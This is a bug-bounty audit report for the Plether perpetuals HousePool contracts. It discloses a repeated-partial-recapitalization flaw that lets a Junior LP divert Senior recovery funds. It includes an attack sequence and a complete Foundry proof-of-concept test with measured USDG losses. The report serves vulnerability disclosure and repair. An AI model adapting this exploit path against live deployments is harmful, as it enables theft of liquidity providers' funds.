# \#99073 [SC-High] Repeated partial recapitalization resets Senior recovery mark and diverts funded assets to Junior

**Submitted on Nov 11th 2026 at 18:30:41 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99073
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


An incumbent Junior LP can make repeated, successful, zero-payout redemption settlements after an honest partial recapitalization. Each pass reserves the same distributable cash against the *remaining* pending recapitalization intent. This erases Senior principal credited by the preceding pass and can replace Senior's original high-water mark (HWM) with the smaller residual intent. When subsequent trading revenue arrives, the waterfall treats Senior as fully restored too early and assigns funds to Junior. A separate Senior LP receives less USDG on an actual funded redemption while the Junior LP receives USDG. The two payout measurements below are the same misallocation and must not be added together.

In the complete public-Router Foundry PoC below, a Senior LP's funded redemption is **28,964.811635 USDG lower** than a one-pass control, and the incumbent Junior LP **claims 29,131.834720 USDG** that it cannot claim in the control. The control and attack branches have the same timestamp, pool cash, outstanding trader claims, and Engine mark immediately before later trading revenue. The maximum effect is bounded by the Senior recovery gap, later available revenue, and Junior redemption capacity; the PoC demonstrates a concrete instance, not an asserted universal maximum.

The later inflow is trading revenue, but Senior is still below the pre-loss recovery mark. Under the project's accounting specification, that revenue first restores **Senior's impaired principal**. The stolen amount is therefore a loss of the Senior holder's funded principal recovery, not merely surplus yield above an already restored Senior position. If adjudicators classify the same cash solely as unclaimed yield, High would be the alternative impact tier.

## Affected code and violated invariant

Scoped commit: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. All affected production code is in `packages/perps/src`.

1. `HousePool.sol:1564-1575,1829-1834`: `_reconcile` recomputes settleable pending recapitalization by capping the **remaining** bucket against the entire current `reconcileSnapshot.distributable` on each pass. It sends the cap to `planReconcile`.
2. `libraries/HousePoolReconcilePlanLib.sol:68-103`: `planReconcile` reserves that cap from ordinary distributable equity before comparing equity to stored tranche principal. On a later pass, the previously credited Senior cash is reserved again; the waterfall records an artificial loss of the earlier Senior credit.
3. `libraries/HousePoolPendingPreviewLib.sol:117-136`: when this leaves both principals zero, `applyClaimantRecapitalizationIntent` bootstraps Senior from the current residual recapitalization amount and **replaces** `seniorHighWaterMark` with that reduced amount. It does not preserve a larger existing recovery mark.
4. `HousePool.sol:957-986` and `TrancheVault.sol:606-630,916-946,1611-1617`: a complete-balance, one-share Junior redemption can be refunded with zero assets yet count as a processed epoch. The holder can claim the share refund and repeat after cooldown, so the reconciliation persists rather than reverting for no progress.

[`packages/perps/ACCOUNTING_SPEC.md:329-340`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340) says losses do not reduce Senior's HWM and future surplus restores Senior before Junior. `packages/perps/SECURITY.md:394` states the same protected-priority invariant.

## Attack sequence

**Existing/honest conditions.** Senior and Junior shares survive a genuine trader-claim deficit that has wiped both stored tranche principals. The owner, acting within the documented recovery process, recapitalizes enough USDG to pay trader claims but less than the amount needed to restore Senior fully, settles the claim, and clears degraded mode. No malicious or compromised owner action is required.

**Attacker-controlled steps.** The attacker already owns material Junior shares and transfers one share to a separate dust address. The dust address requests its complete one-share balance for redemption, waits for maturity, calls permissionless LP settlement, then claims the zero-asset share refund. The attacker repeats this three times, respecting the cooldown. A live open-position epoch uses the public `OrderRouter.settleLpEpoch` route with a fresh six-feed mock Pyth basket; the no-open-position path uses public `HousePool.settleLpEpoch`. Each is the documented callable route for that state.

**Value extraction.** A later ordinary trader close sends real USDG revenue to the HousePool through `CfdEngine`. Senior and Junior holders request and claim their redemptions. The test takes a snapshot immediately after the honest recap and compares one dust pass with three dust passes, aligning the branches before revenue. The Junior holder claims funded assets only in the repeated-pass branch, while a separate Senior victim claims less.

The PoC uses ordinary public Router commit and execute methods for all seven position opens, six distress closes, and the later revenue close. `BasePerpTest`'s `LegacyOrderRouterHarness` scalar commit adapter self-delegates to the production V3 commit path. The test does not impersonate the Router or a vault, edit storage, burn pool tokens, or modify scoped contracts. It uses MockPyth and mock USDG, which the program permits for out-of-scope components, with the release six feed IDs, weights, bases, inversion flags, and release risk settings. Opposing losing traders post about 75% margin; `CfdEngineLens.isLiquidatableAt` verifies they remain healthy at the tested adverse marks.

## Reproduction

Place the complete PoC source below at `packages/perps/test/perps/adjudication/Finding75RouterFullPathMeasured.t.sol` in a clean checkout of the scoped commit. From `packages/perps` run:

```sh
forge test --match-path test/perps/adjudication/Finding75RouterFullPathMeasured.t.sol -vv
```

The independent fresh compilation and rerun passed **1 test, 0 failed** (test gas: 35,238,269 across the complete simulation). The logged six-decimal USDG atom amounts are:

| Measurement | Atoms | USDG |
| --- | ---: | ---: |
| Pre-recapitalization trader-claim deficit | 50,221,078,703 | 50,221.078703 |
| Honest owner recapitalization | 100,000,018,264 | 100,000.018264 |
| Senior victim funded payout decrease versus control | 28,964,811,635 | 28,964.811635 |
| Junior attacker actual claim in attack; zero in control | 29,131,834,720 | 29,131.834720 |

The two payout differences differ because of share ownership, fees, rounding, and seed shares. They do not represent two independent losses. Test source SHA-256: `6569010ceaf62f6d25b3e884c258d3eea6ba0cbcdcafd98a3a816a2b2a68c1a2`.

## Preconditions and feasibility

- The demonstrated distress path needs an **exceptional external six-currency FX basket move**: about 1.0 to 0.4 to 1.6, then back to 1.0. The attacker cannot forge genuine Pyth data or compel this market movement. MockPyth proves code behavior, not the occurrence or likelihood of real signed FX updates. This is the principal feasibility and payout limitation.
- The attacker's material Junior position predates the loss. The test does **not** show a profitable whole-life round trip on its initial 1,000,000 USDG Junior deposit, which is impaired in the crisis. It shows an incremental transfer available to an incumbent Junior holder after a genuine loss. It does not assume a cheap post-wipe purchase.
- The owner must perform a legitimate **partially backed** recapitalization; a fully backed recap does not create this repeated partial-pass condition. The dust/refund sequence spans several hourly epochs. The full test's 35.2 million gas is cumulative across many transactions, not a single on-chain transaction. A guardian may hold LP settlement, but the published program assumes no guaranteed detection or response deadline.
- The reported funds are actually claimed in the local Foundry execution. No extrapolation to TVL or a claimed routine market frequency is used.

## Prior-audit distinction

SC Audit Studio **SC-L1** described an uncapped, **single-pass** pending claimant credit that left false tranche principal/NAV. The response's cap (PR #29) is present at the pinned commit. This report demonstrates what happens on **successive partially backed passes after that cap**: the same cash is reserved again, the Senior HWM is reduced, and later funded revenue reaches Junior. If the project groups it with SC-L1, the runnable pinned-code PoC demonstrates the program's express **incomplete-fix / fix-introduced-bug** exception.

Cecuro **MED-11** concerns HWM scaling on a *funded Senior redemption*; this route has zero-asset Junior refunds and HWM replacement on recap bootstrap. **MED-12** concerns same-batch recap and revenue being stranded as unassigned, whereas the revenue here arrives later and is claimable by Junior. **MED-24** describes zero-payout refund work; it is the known trigger here, not this accounting defect or inter-tranche value transfer. A fresh bounded check of the listed audits, own observed submissions, and public Plether repository issues/commits found no exact disclosure of this repeated-pass effect before filing.

## Suggested repair

Track how much pending recapitalization cash has already been credited so later reconciliations cannot reserve and apply the same physical cash again. Preserve the existing Senior HWM when an empty-principal recapitalization bootstraps from a residual pending amount. Add a regression test with a partially backed recap, multiple successful dust-refund epochs, later real revenue, and separate Senior/Junior funded claims.


## Proof of Concept

# Plether finding 75 — Foundry reproduction

The complete test source appears below; no production contracts are modified.

1. Check out `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with its normal Foundry dependencies installed.
2. Create `packages/perps/test/perps/adjudication/` if needed, then save the Solidity code block below as `Finding75RouterFullPathMeasured.t.sol` in that directory.
3. From `packages/perps`, run:

```sh
forge test --match-path test/perps/adjudication/Finding75RouterFullPathMeasured.t.sol -vv
```

Expected: one passing test and four logs (six-decimal USDG atoms): pre-recap deficit `50221078703`, recap `100000018264`, Senior victim funded-payout decrease `28964811635`, and Junior holder actual claim `29131834720` (zero in control). The control and attack branches match on time, cash, trader claims, and mark before the later revenue event. These are not two additive losses.

The test uses `MockPyth` and mock USDG for out-of-scope components, release six-feed configuration and risk settings, and public Router/LP entrypoints. It does not prove that the extreme 0.4-to-1.6 FX basket movement occurred in a live market.

Test SHA-256: `6569010ceaf62f6d25b3e884c258d3eea6ba0cbcdcafd98a3a816a2b2a68c1a2`.

## Complete Foundry test

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Finding 75 complete route: public Router calls, six positive Pyth feeds, ordinary owner/LP actions.
contract Finding75RouterFullPathMeasured is BasePerpTest {
    address internal constant VICTIM = address(0x750001);
    address internal constant ATTACKER = address(0x750002);
    address internal constant SHORT_A = address(0x1001);
    address internal constant LONG_A = address(0x1002);
    address internal constant SHORT_B = address(0x1003);
    address internal constant LONG_B = address(0x1004);
    address internal constant REVENUE_TRADER = address(0x1005);
    address internal constant SHORT_C = address(0x1006);
    address internal constant LONG_C = address(0x1007);
    address internal constant DUST = address(0xD057);
    bytes32[] internal sixFeedIds;

    struct BranchResult {
        uint256 seniorPrincipal;
        uint256 juniorPrincipal;
        uint256 seniorHighWaterMark;
        uint256 seniorRedeemable;
        uint256 juniorRedeemable;
        uint256 seniorFundedAssets;
        uint256 seniorClaimedAssets;
        uint256 juniorFundedAssets;
        uint256 juniorClaimedAssets;
        uint256 cashBeforeMaterialExit;
        uint256 preRevenueTime;
        uint256 preRevenueCash;
        uint256 preRevenueClaims;
        uint256 preRevenueMark;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1000e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // Release risk parameters from DeployPerpsArbitrumSepolia.s.sol.
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundJunior(ATTACKER, 1_000_000e6);
        _fundSenior(VICTIM, 99_000e6);
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        // Victim funded ordinary Senior shares; attacker funded material Junior shares and gave DUST one share.
        assertGt(seniorVault.balanceOf(VICTIM), 0);
        assertGt(juniorVault.balanceOf(ATTACKER), 1e12);
        vm.warp(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(ATTACKER);
        juniorVault.transfer(DUST, 1);
        assertEq(juniorVault.balanceOf(DUST), 1);

        _rotateToSixFeedOracle();
        _setLiveSix(1e8, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdate());
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 100, "initial six-feed mark");
    }

    function _rotateToSixFeedOracle() internal {
        bytes32[] memory ids = new bytes32[](6);
        uint256[] memory weights = new uint256[](6);
        uint256[] memory bases = new uint256[](6);
        bool[] memory inversions = new bool[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
        for (uint256 i; i < 6; ++i) sixFeedIds.push(ids[i]);

        PletherOracle sixFeedOracle =
            new PletherOracle(address(engine), address(pool), address(baseMockPyth), ids, weights, bases, inversions);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig({pletherOracle: address(sixFeedOracle)}));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        pletherOracle = sixFeedOracle;
    }

    function _emptyUpdate() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _rawSix(uint256 index, uint256 basketPrice) internal pure returns (int64 raw) {
        uint256[6] memory bases = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];
        uint256 normalized = bases[index] * basketPrice / 1e8;
        uint256 value = index == 1 || index >= 3 ? (1e16 + normalized / 2) / normalized : normalized;
        require(value > 0 && value <= uint256(uint64(type(int64).max)), "positive signed Pyth price");
        raw = int64(uint64(value));
    }

    function _setLiveSix(uint256 basketPrice, uint256 publishTime) internal {
        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setPrice(sixFeedIds[i], _rawSix(i, basketPrice), 0, -8, publishTime);
        }
    }

    function _setUniqueSix(uint256 basketPrice, uint256 publishTime, uint256 previousTime) internal {
        for (uint256 i; i < 6; ++i) {
            baseMockPyth.setUniquePrice(sixFeedIds[i], _rawSix(i, basketPrice), 0, -8, publishTime, previousTime);
            (, , , uint256 actualPublishTime, uint256 actualPreviousTime) = baseMockPyth.uniquePrices(sixFeedIds[i]);
            assertEq(actualPublishTime, publishTime, "staged publish time");
            assertEq(actualPreviousTime, previousTime, "staged previous time");
        }
    }

    function _route(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 basketPrice
    ) internal {
        vm.prank(trader);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        uint256 tick = uint256(pending.commitTime) + 1;
        vm.warp(tick);
        vm.roll(vm.getBlockNumber() + 1);
        _setUniqueSix(basketPrice, tick, tick - 2);
        _setLiveSix(basketPrice, tick);
        OrderV3Types.ExecutionResult memory outcome = router.executeOrder(orderId, _emptyUpdate());
        assertEq(uint8(outcome.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Router execution must fill");
        assertApproxEqAbs(engine.lastMarkPrice(), basketPrice, 100, "six-feed basket mark");
    }

    function _honestDistress() internal returns (uint256 deficit) {
        _fundTrader(SHORT_A, 400_000e6);
        _fundTrader(LONG_A, 400_000e6);
        _fundTrader(SHORT_B, 400_000e6);
        _fundTrader(LONG_B, 400_000e6);
        _fundTrader(REVENUE_TRADER, 100_000e6);
        _fundTrader(SHORT_C, 200_000e6);
        _fundTrader(LONG_C, 200_000e6);

        // Alternating sides keeps every intermediate skew below the release 0.4 WAD limit.
        _route(SHORT_A, CfdTypes.Side.SHORT, 400_000e18, 300_000e6, false, 1e8);
        _route(LONG_A, CfdTypes.Side.LONG, 400_000e18, 300_000e6, false, 1e8);
        _route(SHORT_B, CfdTypes.Side.SHORT, 400_000e18, 300_000e6, false, 1e8);
        _route(LONG_B, CfdTypes.Side.LONG, 400_000e18, 300_000e6, false, 1e8);
        _route(SHORT_C, CfdTypes.Side.SHORT, 160_200e18, 120_000e6, false, 1e8);
        _route(LONG_C, CfdTypes.Side.LONG, 160_200e18, 120_000e6, false, 1e8);
        // This fully margin-backed Long remains open at a neutral mark through the recap.
        _route(REVENUE_TRADER, CfdTypes.Side.LONG, 49_500e18, 60_000e6, false, 1e8);

        // At the opposite side's winning mark, collateral still covers losses and maintenance.
        assertFalse(engineLens.isLiquidatableAt(SHORT_A, 0.4e8, pool.totalAssets()));
        assertFalse(engineLens.isLiquidatableAt(SHORT_B, 0.4e8, pool.totalAssets()));
        assertFalse(engineLens.isLiquidatableAt(SHORT_C, 0.4e8, pool.totalAssets()));
        assertFalse(engineLens.isLiquidatableAt(LONG_A, 1.6e8, pool.totalAssets()));
        assertFalse(engineLens.isLiquidatableAt(LONG_B, 1.6e8, pool.totalAssets()));
        assertFalse(engineLens.isLiquidatableAt(LONG_C, 1.6e8, pool.totalAssets()));

        // A positive 0.4x mark pays Longs, then a positive 1.6x mark pays Shorts.
        _route(LONG_A, CfdTypes.Side.LONG, 400_000e18, 0, true, 0.4e8);
        _route(LONG_B, CfdTypes.Side.LONG, 400_000e18, 0, true, 0.4e8);
        _route(LONG_C, CfdTypes.Side.LONG, 160_200e18, 0, true, 0.4e8);
        assertTrue(engine.degradedMode());
        _route(SHORT_A, CfdTypes.Side.SHORT, 400_000e18, 0, true, 1.6e8);
        _route(SHORT_B, CfdTypes.Side.SHORT, 400_000e18, 0, true, 1.6e8);
        _route(SHORT_C, CfdTypes.Side.SHORT, 160_200e18, 0, true, 1.6e8);

        // Return the outstanding Long to a neutral mark. Its later loss is new revenue, not prior LP NAV.
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 neutralTime = vm.getBlockTimestamp();
        _setUniqueSix(1e8, neutralTime, neutralTime - 1);
        _setLiveSix(1e8, neutralTime);
        router.updateMarkPrice(_emptyUpdate());
        assertEq(engine.terminalNavSnapshot().terminalLpPriceDeltaAssets, 0);

        assertGt(engine.totalTraderClaimBalanceAssets(), pool.totalAssets());
        deficit = engine.totalTraderClaimBalanceAssets() - pool.totalAssets();
        assertGt(seniorVault.totalSupply(), 0);
        assertGt(juniorVault.totalSupply(), 1e14);
    }

    function _dustPass() internal {
        uint256 unlock = juniorVault.lastDepositTime(DUST) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlock) vm.warp(unlock);
        vm.prank(DUST);
        uint256 requestId = juniorVault.requestRedeem(1, DUST, DUST);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < maturity) vm.warp(maturity);

        uint256 rawBefore = settlementToken.balanceOf(address(pool));
        uint256 supplyBefore = juniorVault.totalSupply();
        // An open position requires a Router-bound fresh mark for the matured epoch.
        IHousePool.LpEpochSettlementResult memory result;
        if (engine.terminalNavSnapshot().hasOpenPositions) {
            uint256 passTime = vm.getBlockTimestamp();
            _setUniqueSix(1e8, passTime, passTime - 1);
            _setLiveSix(1e8, passTime);
            router.settleLpEpoch(_emptyUpdate());
        } else {
            result = pool.settleLpEpoch(0, 0);
        }
        if (!engine.terminalNavSnapshot().hasOpenPositions) {
            assertEq(result.juniorProcessedEpochs, 1, "dust epoch must count as real progress");
            assertEq(result.juniorFundedAssets, 0, "dust epoch must pay zero");
            assertEq(result.juniorFundedShares, 0, "dust share must not burn");
        }
        vm.prank(DUST);
        assertEq(juniorVault.claimRedeemRefund(requestId, DUST, DUST), 1);
        assertEq(juniorVault.balanceOf(DUST), 1);
        assertEq(juniorVault.totalSupply(), supplyBefore);
        assertEq(settlementToken.balanceOf(address(pool)), rawBefore);
    }

    function _runBranch(uint256 preRevenuePasses, uint256 materialShares, uint256 matchedRevenueTime)
        internal
        returns (BranchResult memory result)
    {
        for (uint256 i; i < preRevenuePasses; ++i) _dustPass();
        if (preRevenuePasses == 1) assertGt(pool.pendingRecapitalizationAssets(), 0);
        else assertEq(pool.pendingRecapitalizationAssets(), 0);

        if (matchedRevenueTime != 0) {
            assertGe(matchedRevenueTime, vm.getBlockTimestamp());
            vm.warp(matchedRevenueTime);
            vm.roll(vm.getBlockNumber() + 1);
            _setUniqueSix(1e8, matchedRevenueTime, matchedRevenueTime - 1);
            _setLiveSix(1e8, matchedRevenueTime);
            router.updateMarkPrice(_emptyUpdate());
        }
        result.preRevenueTime = vm.getBlockTimestamp();
        result.preRevenueCash = pool.totalAssets();
        result.preRevenueClaims = engine.totalTraderClaimBalanceAssets();
        result.preRevenueMark = engine.lastMarkPrice();

        // Actual trader loss transfers margin cash to HousePool through Engine and records Revenue/CashArrived.
        uint256 cashBeforeRevenue = pool.totalAssets();
        _route(REVENUE_TRADER, CfdTypes.Side.LONG, 49_500e18, 0, true, 1.6e8);
        assertGt(pool.totalAssets(), cashBeforeRevenue);
        assertEq(pool.pendingTradingRevenueAssets(), 0, "positive stored Senior prevents a revenue queue");
        _dustPass();
        if (preRevenuePasses == 3) assertEq(pool.pendingRecapitalizationAssets(), 0);

        result.seniorPrincipal = pool.seniorPrincipal();
        result.juniorPrincipal = pool.juniorPrincipal();
        result.seniorHighWaterMark = pool.seniorHighWaterMark();
        result.seniorRedeemable = seniorVault.estimateRedeemAssets(seniorVault.balanceOf(VICTIM));
        result.juniorRedeemable = juniorVault.estimateRedeemAssets(materialShares);
        result.cashBeforeMaterialExit = settlementToken.balanceOf(address(pool));

        uint256 juniorUnlock = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        uint256 seniorUnlock = seniorVault.lastDepositTime(VICTIM) + seniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < juniorUnlock) vm.warp(juniorUnlock);
        if (vm.getBlockTimestamp() < seniorUnlock) vm.warp(seniorUnlock);
        uint256 seniorShares = seniorVault.maxRequestRedeem(VICTIM);
        assertGt(seniorShares, 0);
        vm.prank(VICTIM);
        uint256 seniorRequestId = seniorVault.requestRedeem(seniorShares, VICTIM, VICTIM);
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(materialShares, ATTACKER, ATTACKER);
        uint256 maturity = pool.lpEpochStart(requestId);
        if (pool.lpEpochStart(seniorRequestId) > maturity) maturity = pool.lpEpochStart(seniorRequestId);
        if (vm.getBlockTimestamp() < maturity) vm.warp(maturity);
        IHousePool.LpEpochSettlementResult memory exitResult = pool.settleLpEpoch(0, 0);
        result.seniorFundedAssets = exitResult.seniorFundedAssets;
        result.juniorFundedAssets = exitResult.juniorFundedAssets;
        uint256 seniorFundedShares = seniorVault.claimableRedeemRequest(seniorRequestId, VICTIM);
        assertGt(seniorFundedShares, 0);
        uint256 victimBefore = settlementToken.balanceOf(VICTIM);
        vm.prank(VICTIM);
        seniorVault.claimRedeem(seniorRequestId, seniorFundedShares, VICTIM, VICTIM);
        result.seniorClaimedAssets = settlementToken.balanceOf(VICTIM) - victimBefore;
        uint256 fundedShares = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        if (fundedShares > 0) {
            uint256 beforeBalance = settlementToken.balanceOf(ATTACKER);
            vm.prank(ATTACKER);
            juniorVault.claimRedeem(requestId, fundedShares, ATTACKER, ATTACKER);
            result.juniorClaimedAssets = settlementToken.balanceOf(ATTACKER) - beforeBalance;
        }
    }

    function test_HonestDeficitDustRecapShiftsRedeemableValueAndJuniorPayout() public {
        uint256 deficit = _honestDistress();
        uint256 recapAmount = pool.seniorHighWaterMark();
        assertGt(recapAmount, deficit);
        assertLt(recapAmount, 2 * deficit, "partial recap must fit the three-pass case");

        settlementToken.mint(address(this), recapAmount);
        settlementToken.approve(address(engine), recapAmount);
        engine.recapitalizePool(recapAmount);
        assertEq(pool.pendingRecapitalizationAssets(), recapAmount);
        vm.prank(SHORT_C);
        engine.settleTraderClaim(SHORT_C);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode());

        uint256 distributable = pool.totalAssets();
        assertEq(distributable, recapAmount - deficit);
        uint256 materialShares = juniorVault.maxRequestRedeem(ATTACKER);
        assertGt(materialShares, 1e12);
        uint256 state = vm.snapshotState();

        BranchResult memory attack = _runBranch(3, materialShares, 0);
        assertTrue(vm.revertToState(state));
        vm.deleteStateSnapshot(state);
        BranchResult memory control = _runBranch(1, materialShares, attack.preRevenueTime);

        assertEq(control.preRevenueTime, attack.preRevenueTime);
        assertEq(control.preRevenueCash, attack.preRevenueCash);
        assertEq(control.preRevenueClaims, attack.preRevenueClaims);
        assertEq(control.preRevenueMark, attack.preRevenueMark);
        assertEq(control.cashBeforeMaterialExit, attack.cashBeforeMaterialExit);
        assertEq(control.juniorPrincipal, 0);
        assertEq(control.juniorFundedAssets, 0);
        assertEq(control.juniorClaimedAssets, 0);
        assertEq(control.seniorClaimedAssets, control.seniorFundedAssets);
        assertEq(attack.seniorClaimedAssets, attack.seniorFundedAssets);
        assertGt(control.seniorClaimedAssets, attack.seniorClaimedAssets);
        assertLt(attack.seniorHighWaterMark, control.seniorHighWaterMark);
        assertLt(attack.seniorPrincipal, control.seniorPrincipal);
        assertGt(attack.juniorPrincipal, control.juniorPrincipal);
        assertLt(attack.seniorRedeemable, control.seniorRedeemable);
        assertGt(attack.juniorRedeemable, control.juniorRedeemable);
        assertGt(attack.juniorFundedAssets, 0);
        assertEq(attack.juniorClaimedAssets, attack.juniorFundedAssets);

        console2.log("Pre-recap deficit atoms", deficit);
        console2.log("Recap atoms", recapAmount);
        console2.log("Senior victim payout loss atoms", control.seniorClaimedAssets - attack.seniorClaimedAssets);
        console2.log("Junior attacker actual claim atoms", attack.juniorClaimedAssets);

    }
}

```
